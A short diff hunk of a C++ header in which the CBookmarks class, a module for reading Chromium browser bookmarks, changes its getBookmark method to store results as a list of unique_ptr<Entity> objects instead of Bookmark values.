@@ -15,7 +15,7 @@ class CBookmarks : public ChromiumBrowserModule {
 public:
     void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
 private:
-    static void getBookmark(const json &j, std::list<Bookmark> &data);
+    static void getBookmark(const json &j, std::list<std::unique_ptr<Entity>> &data);
 };
 
 
